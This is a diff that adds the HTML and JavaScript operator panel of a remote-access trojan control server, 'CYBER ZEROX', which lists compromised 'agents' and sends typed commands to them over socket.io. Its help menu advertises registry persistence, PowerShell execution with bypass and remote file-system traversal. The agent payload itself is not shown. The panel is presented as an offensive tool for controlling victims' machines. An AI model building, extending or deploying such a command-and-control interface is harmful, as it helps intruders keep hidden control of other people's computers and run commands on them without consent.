@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER ZEROX ULTIMATE | Takhirov Fazliddin</title>
+    <!-- Master Class Libraries -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=JetBrains+Mono:wght@300;400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    
+    <style>
+        :root {
+            --neon-green: #00ff9d;
+            --neon-blue: #00ff9d; /* Changed from blue to green as requested */
+            --neon-pink: #ff00ff;
+            --neon-alert: #ffca00;
+            --bg-deep: #010105;
+            --panel-bg: rgba(5, 15, 5, 0.85);
+            --border-glow: 0 0 15px rgba(0, 255, 157, 0.5);
+            --font-mono: 'JetBrains Mono', monospace;
+            --font-cyber: 'Orbitron', sans-serif;
+        }
+
+        * { margin:0; padding:0; box-sizing:border-box; cursor: crosshair; }
+        
+        body {
+            background-color: var(--bg-deep);
+            color: var(--neon-blue);
+            font-family: var(--font-mono);
+            height: 100vh;
+            overflow: hidden;
+            display: grid;
+            grid-template-rows: 80px 1fr 35px;
+        }
+
+        /* Expert UI - Background Layers */
+        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.3; }
+        #matrix-fx { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; filter: blur(0.5px); }
+        
+        .scanlines {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            background-size: 100% 3px, 3px 100%;
+            pointer-events: none; z-index: 999;
+        }
+
+        /* Top Navigation / Header */
+        header {
+            background: rgba(0, 5, 10, 0.95);
+            border-bottom: 3px solid var(--neon-blue);
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 50px; box-shadow: 0 0 30px rgba(0, 240, 255, 0.3);
+            z-index: 100;
+        }
+
+        .brand { display: flex; align-items: center; gap: 20px; }
+        .brand-logo { font-size: 2.5rem; color: #fff; text-shadow: 0 0 20px var(--neon-blue); }
+        .brand-text h1 { font-family: var(--font-cyber); font-weight: 900; letter-spacing: 8px; color: #fff; }
+        .brand-text p { font-size: 0.7rem; letter-spacing: 4px; color: var(--neon-pink); font-weight: bold; }
+
+        .system-ops { display: flex; gap: 50px; font-family: var(--font-cyber); font-size: 0.85rem; }
+        .op-stat { display: flex; flex-direction: column; align-items: flex-end; }
+        .op-stat b { display: block; color: var(--neon-pink); font-size: 1rem; }
+
+        /* Unified Workspace Layout */
+        .workspace {
+            display: grid;
+            grid-template-columns: 340px 1fr 340px;
+            padding: 20px; gap: 20px; 
+            height: calc(100vh - 115px); /* Pin workspace height */
+            overflow: hidden;
+            perspective: 1000px;
+        }
+
+        .u-panel {
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 255, 157, 0.3);
+            border-radius: 8px;
+            display: flex; flex-direction: column;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            transition: 0.5s;
+            height: 100%; /* Force panel to container height */
+            overflow: hidden;
+        }
+
+        .u-panel-head {
+            padding: 15px 20px;
+            background: linear-gradient(90deg, rgba(0, 255, 157, 0.1), transparent);
+            border-bottom: 1px solid rgba(0, 255, 157, 0.2);
+            font-family: var(--font-cyber); font-size: 0.75rem; font-weight: 900;
+            display: flex; justify-content: space-between; color: #fff;
+            flex-shrink: 0;
+        }
+
+        /* Sidebar - Agent Repository */
+        #agent-repo { flex: 1; overflow-y: auto; padding: 15px; }
+        .agent-item {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.05);
+            padding: 18px; margin-bottom: 15px; border-radius: 6px;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative; overflow: hidden;
+        }
+
+        .agent-item:hover { border-color: var(--neon-blue); background: rgba(0, 240, 255, 0.08); transform: scale(1.03); }
+        .agent-item.active { border-color: var(--neon-green); background: rgba(0, 255, 157, 0.12); }
+        
+        .agent-name { font-weight: 900; font-size: 1.1rem; color: #fff; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
+        .agent-details { font-size: 0.75rem; color: #777; line-height: 1.6; }
+        .agent-details b { color: var(--neon-blue); }
+
+        .pulse-dot { width: 10px; height: 10px; border-radius: 50%; box-shadow: 0 0 10px currentColor; }
+
+        /* Main Shell - Center Master Panel */
+        .master-shell { border-color: rgba(0, 255, 157, 0.6); }
+        #shell-output {
+            flex: 1; 
+            overflow-y: auto; 
+            overflow-x: hidden;
+            padding: 30px;
+            font-size: 0.95rem; 
+            line-height: 1.8; 
+            color: #eee;
+            scroll-behavior: smooth;
+            border-bottom: 1px solid rgba(0, 255, 157, 0.1);
+        }
+
+        /* Hero ASCII Branding */
+        .hero-branding {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 40px;
+            padding: 20px;
+            background: radial-gradient(circle, rgba(0, 240, 255, 0.05) 0%, transparent 70%);
+            border-radius: 20px;
+        }
+
+        .ascii-logo { font-family: 'Share Tech Mono', monospace; line-height: 1.1; pointer-events: none; text-align: left; margin: 0; }
+        .skull { color: var(--neon-pink); text-shadow: 0 0 15px var(--neon-pink); font-size: 6px; margin-bottom: 15px; }
+        .takhirov-logo { color: var(--neon-blue); text-shadow: 0 0 15px var(--neon-blue); font-size: 8px; }
+
+        .log-line { margin-bottom: 8px; animation: fadeInUp 0.3s; }
+        .prm-line { color: var(--neon-green); font-weight: 900; margin-right: 15px; font-family: 'Share Tech Mono'; }
+        .out-box { 
+            background: rgba(0,0,0,0.3); 
+            border-radius:4px; 
+            padding: 10px 15px; 
+            border-left: 2px solid var(--neon-blue); 
+            white-space: pre-wrap; 
+            word-break: break-all; 
+            margin-top: 5px;
+            font-size: 0.95rem; /* Slightly larger text */
+            line-height: 1.3;   /* Tighter line height for better chunk reading */
+            color: #d1f7ff;
+            font-family: 'JetBrains Mono', monospace;
+            text-shadow: 0 0 2px rgba(0, 255, 157, 0.1);
+        }
+        .cmd-line { color: #fff; font-weight: bold; }
+        .status-msg { font-style: italic; font-size: 0.8rem; color: #555; }
+        
+        /* Loading animation for terminal */
+        .loading-dots:after {
+            content: '.';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60% { content: '...'; }
+            80%, 100% { content: ''; }
+        }
+
+        /* Command Entry Deck */
+        .terminal-deck {
+            height: 70px; background: rgba(0,0,0,0.8); border-top: 2px solid var(--neon-green);
+            display: flex; align-items: center; padding: 0 35px; gap: 20px;
+            flex-shrink: 0; /* Never collapse input area */
+            z-index: 5;
+        }
+
+        .deck-badge { font-family: var(--font-cyber); font-size: 0.8rem; color: var(--neon-blue); text-transform: uppercase; font-weight: 900; }
+        #core-input { flex: 1; background: transparent; border: none; outline: none; color: #fff; font-family: var(--font-mono); font-size: 1.3rem; }
+
+        /* Right Panel - Intel & Analytics */
+        .intel-box { padding: 25px; display: flex; flex-direction: column; gap: 25px; }
+        .intel-card { background: rgba(0, 10, 20, 0.4); border: 1px solid rgba(255,255,255,0.05); padding: 20px; border-radius: 8px; }
+        .intel-card h4 { font-family: var(--font-cyber); font-size: 0.7rem; color: var(--neon-pink); margin-bottom: 12px; border-bottom: 1px solid rgba(255,0,255,0.1); padding-bottom: 5px; }
+        .intel-card p { font-size: 0.95rem; color: #fff; word-break: break-all; }
+
+        .metric-bar { height: 4px; background: #222; border-radius: 2px; margin-top: 10px; overflow: hidden; position: relative; }
+        .metric-fill { height: 100%; width: 0%; background: var(--neon-blue); box-shadow: 0 0 10px var(--neon-blue); transition: 1s; }
+
+        /* Footer */
+        footer {
+            background: #000; border-top: 1px solid #111; display: flex; align-items: center; justify-content: space-between;
+            padding: 0 40px; font-size: 0.75rem; font-family: var(--font-cyber); letter-spacing: 3px;
+        }
+
+        .op-name { color: var(--neon-blue); }
+        .tg-link { color: var(--neon-pink); text-decoration: none; font-weight: bold; border: 1px solid var(--neon-pink); padding: 2px 8px; border-radius: 4px; }
+
+        /* Keyframes */
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        
+        /* Expert Scrollbar */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: linear-gradient(var(--neon-blue), var(--neon-pink)); border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="scanlines"></div>
+    <canvas id="bg-canvas"></canvas>
+    <canvas id="matrix-fx"></canvas>
+
+    <header>
+        <div class="brand">
+            <i class="fas fa-shield-halved brand-logo"></i>
+            <div class="brand-text">
+                <h1>CYBER ZEROX</h1>
+                <p>ULTIMATE CYBER COMMAND CENTER</p>
+            </div>
+        </div>
+        <div class="system-ops">
+            <div class="op-stat">UPTIME <b id="sys-uptime">00:00:00</b></div>
+            <div class="op-stat">TARGETS <b id="sys-targets">0</b></div>
+            <div class="op-stat">ENCRYPTION <b>RSA-4096</b></div>
+        </div>
+    </header>
+
+    <div class="workspace">
+        <!-- AGENT AREA -->
+        <div class="u-panel">
+            <div class="u-panel-head"><span>ACTIVE_AGENTS</span><i class="fas fa-network-wired"></i></div>
+            <div id="agent-repo">
+                <!-- Dynamic Nodes -->
+            </div>
+        </div>
+
+        <!-- COMMAND AREA -->
+        <div class="u-panel master-shell">
+            <div class="u-panel-head"><span>ZEROX_COMMAND_UNIT [v2.5]</span><i class="fas fa-terminal"></i></div>
+            <div id="shell-output">
+                <div class="hero-branding">
+                    <pre class="ascii-logo skull">
+                  uuuuuuu
+              uu$$$$$$$$$$$uu
+           uu$$$$$$$$$$$$$$$$$uu
+          u$$$$$$$$$$$$$$$$$$$$$u
+         u$$$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$"   "$$$"   "$$$$$$u
+        "$$$$"      u$u       $$$$"
+         $$$u       u$u       u$$$
+         $$$u      u$$$u      u$$$
+          "$$$$uu$$$   $$$uu$$$$"
+           "$$$$$$$"   "$$$$$$$"
+             u$$$$$$$u$$$$$$$u
+              u$"$"$"$"$"$"$u
+   uuu        $$u$ $ $ $ $u$$       uuu
+  u$$$$        $$$$$u$u$u$$$       u$$$$
+   $$$$$uu      "$$$$$$$$$"     uu$$$$$$
+ u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+ $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$MM"$$$"
+  """      ""$$$$$$$$$$$uu ""$"""
+            uuuu ""$$$$$$$$$$uuu
+   u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+   $$$$$$$$$$MM""           ""$$$$$$$$$$$
+    "$$$$$"                      ""$$$$""
+      $$$"                         $$$$"
+                    </pre>
+                    <pre class="ascii-logo takhirov-logo">
+████████╗ █████╗ ██╗  ██╗██╗  ██╗██╗██████╗  ██████╗ ██╗   ██╗
+╚══██╔══╝██╔══██╗██║ ██╔╝██║  ██║██║██╔══██╗██╔═══██╗██║   ██║
+   ██║   ███████║█████╔╝ ███████║██║██████╔╝██║   ██║██║   ██║
+   ██║   ██╔══██║██╔═██╗ ██╔══██║██║██╔══██╗██║   ██║╚██╗ ██╔╝
+   ██║   ██║  ██║██║  ██╗██║  ██║██║██║  ██║╚██████╔╝ ╚████╔╝ 
+   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═══╝  
+
+███████╗ █████╗ ███████╗██╗     ██╗██████╗ ██████╗ ██╗███╗   ██╗
+██╔════╝██╔══██╗╚══███╔╝██║     ██║██╔══██╗██╔══██╗██║████╗  ██║
+█████╗  ███████║  ███╔╝ ██║     ██║██║  ██║██║  ██║██║██╔██╗ ██║
+██╔══╝  ██╔══██║ ███╔╝  ██║     ██║██║  ██║██║  ██║██║██║╚██╗██║
+██║     ██║  ██║███████╗███████╗██║██████╔╝██████╔╝██║██║ ╚████║
+╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
+                    </pre>
+                </div>
+
+                <div class="log-line">
+                    <span style="color:var(--neon-blue)">[SYSTEM]</span> Cyber ZeroX 2.5 Master Deployment successfully loaded.<br>
+                    <span style="color:var(--neon-pink)">[AUTH]</span> Logged in as: <b>Operator_Fazliddin</b><br>
+                    <span style="color:var(--neon-green)">[STATUS]</span> Secure tunnel active. Waiting for signal...
+                </div>
+            </div>
+            
+            <div class="terminal-deck">
+                <div class="deck-badge" id="shell-prompt">PATH_@_ZEROX : ~ $</div>
+                <input type="text" id="core-input" placeholder=">> ENTER COMMAND" autocomplete="off" autofocus>
+            </div>
+        </div>
+
+        <!-- ANALYTICS AREA -->
+        <div class="u-panel">
+            <div class="u-panel-head"><span>INTEL_DATABASE</span><i class="fas fa-microchip"></i></div>
+            <div class="intel-box">
+                <div class="intel-card">
+                    <h4>SELECTED_NODE</h4>
+                    <p id="stat-host">OFFLINE</p>
+                </div>
+                <div class="intel-card">
+                    <h4>SYSTEM_RESOURCE_LOAD</h4>
+                    <div class="metric-bar"><div class="metric-fill" id="load-bar"></div></div>
+                </div>
+                <div class="intel-card">
+                    <h4>GEO_LOCATION</h4>
+                    <p id="stat-ip">UNKNOWN</p>
+                </div>
+                <div class="intel-card">
+                    <h4>DIRECTORY_WATCH</h4>
+                    <p id="stat-cwd" style="font-size:0.7rem; color:var(--neon-blue)">/</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="op-label">ZEROX OPERATOR: <b class="op-name">TAKHIROV FAZLIDDIN</b></div>
+        <div class="social-tags">
+            SECURED END-TO-END | 
+            <a href="https://t.me/Fazliddin_Cyber" class="tg-link" target="_blank">@Fazliddin_Cyber</a>
+        </div>
+        <div id="live-timer">00:00:00</div>
+    </footer>
+
+    <script>
+        const socket = io();
+        let targetId = null;
+        let commandHistory = [];
+        let historyIndex = -1;
+
+        const out = document.getElementById('shell-output');
+        const input = document.getElementById('core-input');
+        const promptText = document.getElementById('shell-prompt');
+
+        // Expert Visuals - Background Particles
+        const bgC = document.getElementById('bg-canvas');
+        const bgCtx = bgC.getContext('2d');
+        bgC.width = window.innerWidth; bgC.height = window.innerHeight;
+        let particles = [];
+        for(let i=0; i<100; i++) particles.push({x:Math.random()*bgC.width, y:Math.random()*bgC.height, r:Math.random()*2, s:Math.random()*0.5});
+        function drawBg() {
+            bgCtx.clearRect(0,0,bgC.width, bgC.height);
+            bgCtx.fillStyle = '#00f0ff';
+            particles.forEach(p => {
+                bgCtx.beginPath(); bgCtx.arc(p.x, p.y, p.r, 0, Math.PI*2); bgCtx.fill();
+                p.y += p.s; if(p.y > bgC.height) p.y = 0;
+            });
+            requestAnimationFrame(drawBg);
+        }
+        drawBg();
+
+        // Matrix Logic
+        const mx = document.getElementById('matrix-fx');
+        const mxCtx = mx.getContext('2d');
+        mx.width = window.innerWidth; mx.height = window.innerHeight;
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        const drops = Array(Math.floor(mx.width/20)).fill(1);
+        function drawMx() {
+            mxCtx.fillStyle = 'rgba(0,0,0,0.1)'; mxCtx.fillRect(0,0,mx.width, mx.height);
+            mxCtx.fillStyle = '#00ff9d'; mxCtx.font = "16px Share Tech Mono";
+            drops.forEach((y, i) => {
+                const text = chars[Math.floor(Math.random()*chars.length)];
+                mxCtx.fillText(text, i*20, y*20);
+                
+                // Occasional glow on some characters
+                if(Math.random() > 0.95) {
+                    mxCtx.fillStyle = '#fff';
+                    mxCtx.fillText(text, i*20, y*20);
+                    mxCtx.fillStyle = '#00ff9d';
+                }
+
+                if(y*20 > mx.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawMx, 40);
+
+        setInterval(() => {
+            const time = new Date().toLocaleTimeString();
+            document.getElementById('live-timer').innerText = time;
+            document.getElementById('sys-uptime').innerText = time;
+        }, 1000);
+
+        socket.on('agent_list', (agents) => {
+            document.getElementById('sys-targets').innerText = agents.filter(a => a.status === 'Active').length;
+            const container = document.getElementById('agent-repo');
+            container.innerHTML = '';
+            agents.forEach(a => {
+                const div = document.createElement('div');
+                div.className = `agent-item animate__animated animate__fadeInLeft ${a.id === targetId ? 'active' : ''}`;
+                div.onclick = () => activateNode(a);
+                div.innerHTML = `
+                    <div class="agent-name">
+                        <div class="pulse-dot" style="background:${a.status==='Active'?'var(--neon-green)':'var(--neon-pink)'}"></div>
+                        ${a.hostname}
+                    </div>
+                    <div class="agent-details">
+                        <b>ID:</b> ${a.id.split(':')[0]} <br>
+                        <b>OP:</b> ${a.username} | ${a.os}
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+            if(targetId) {
+                const node = agents.find(x => x.id === targetId);
+                if(node) updateMetrics(node);
+            }
+        });
+
+        function activateNode(a) {
+            targetId = a.id;
+            updateMetrics(a);
+            document.querySelectorAll('.agent-item').forEach(i => i.classList.remove('active'));
+            
+            out.innerHTML = ''; // Clear for new agent
+            appendOutput(`SYSTEM`, `CYBER ZEROX :: SECURE ENCRYPTED CHANNEL OPENED`, `var(--neon-green)`);
+            appendOutput(`SYSTEM`, `REMOTE HOST: ${a.hostname} (${a.id})`, `var(--neon-blue)`);
+            appendOutput(`SYSTEM`, `Ready for instructions. Type 'help' for command list.`, `var(--neon-pink)`);
+            
+            input.focus();
+            
+            // Random bar update
+            document.getElementById('load-bar').style.width = Math.floor(Math.random()*80 + 20) + '%';
+        }
+
+        function updateMetrics(a) {
+            document.getElementById('stat-host').innerText = a.hostname;
+            document.getElementById('stat-ip').innerText = a.id.split(':')[0];
+            document.getElementById('stat-cwd').innerText = a.cwd;
+            promptText.innerText = `${a.username}@${a.hostname.split(' ')[0]} : ${a.cwd} >`;
+        }
+
+        function appendOutput(label, text, labelColor = 'var(--neon-blue)', isRaw = false) {
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            if (label === 'PROMPT') {
+                line.innerHTML = `<span class="prm-line">${promptText.innerText}</span><span class="cmd-line">${text}</span>`;
+            } else if (label === 'RESULT') {
+                const box = document.createElement('div');
+                box.className = 'out-box animate__animated animate__fadeIn';
+                box.innerText = text;
+                line.appendChild(box);
+            } else {
+                line.innerHTML = `<span style="color:${labelColor}">[${label}]</span> ${text}`;
+            }
+            out.appendChild(line);
+            out.scrollTop = out.scrollHeight;
+        }
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const cmd = input.value.trim();
+                if (!cmd) return;
+                
+                // Local commands
+                if (cmd.toLowerCase() === 'clear') {
+                    out.innerHTML = '';
+                    input.value = '';
+                    return;
+                }
+                
+                if (cmd.toLowerCase() === 'history') {
+                    appendOutput('SYSTEM', 'COMMAND_HISTORY:', 'var(--neon-blue)');
+                    commandHistory.forEach((h, i) => {
+                        appendOutput('HISTORY', `[${commandHistory.length - i}] ${h}`);
+                    });
+                    input.value = '';
+                    return;
+                }
+
+                if (cmd.toLowerCase() === 'help') {
+                    const helpText = `
+                    <div style="color:var(--neon-blue); font-family:var(--font-cyber); margin:10px 0;">CYBER ZEROX v2.5 - COMMAND PROTOCOL</div>
+                    <table style="width:100%; font-size:0.8rem; border-collapse:collapse;">
+                        <tr><td style="color:var(--neon-pink); width:120px;">sysinfo</td><td>Retrieve detailed host telemetry Data</td></tr>
+                        <tr><td style="color:var(--neon-pink);">persist</td><td>Establish registry-based persistence</td></tr>
+                        <tr><td style="color:var(--neon-pink);">ps [cmd]</td><td>Execute powerShell commands with bypass</td></tr>
+                        <tr><td style="color:var(--neon-pink);">cd [path]</td><td>Traverse remote file system</td></tr>
+                        <tr><td style="color:var(--neon-pink);">clear</td><td>Purge local terminal buffer</td></tr>
+                        <tr><td style="color:var(--neon-pink);">history</td><td>Display session command logs</td></tr>
+                        <tr><td style="color:var(--neon-pink);">exit</td><td>Terminate remote session</td></tr>
+                    </table>
+                    `;
+                    appendOutput('SYSTEM', helpText, 'var(--neon-blue)');
+                    input.value = '';
+                    return;
+                }
+
+                if (!targetId) {
+                    appendOutput('ERROR', 'TARGET_NODE_NOT_SELECTED', 'var(--neon-pink)');
+                    input.value = '';
+                    return;
+                }
+
+                // Add to history
+                commandHistory.unshift(cmd);
+                historyIndex = -1;
+
+                appendOutput('PROMPT', cmd);
+                
+                const loadingId = 'load-' + Date.now();
+                const loadLine = document.createElement('div');
+                loadLine.id = loadingId;
+                loadLine.className = 'log-line status-msg';
+                loadLine.innerHTML = `Executing <span class="loading-dots"></span>`;
+                out.appendChild(loadLine);
+                out.scrollTop = out.scrollHeight;
+
+                socket.emit('execute_command', { agent_id: targetId, command: cmd, callback_id: loadingId });
+                input.value = '';
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    input.value = commandHistory[historyIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    input.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = -1;
+                    input.value = '';
+                }
+            }
+        });
+
+        socket.on('command_result', (data) => {
+            // Remove loading msg if exists
+            const loader = document.getElementById(data.callback_id);
+            if (loader) loader.remove();
+
+            if (data.agent_id !== targetId) return;
+            appendOutput('RESULT', data.result);
+        });
+
+        document.body.onclick = () => input.focus();
+    </script>
+</body>
+</html>
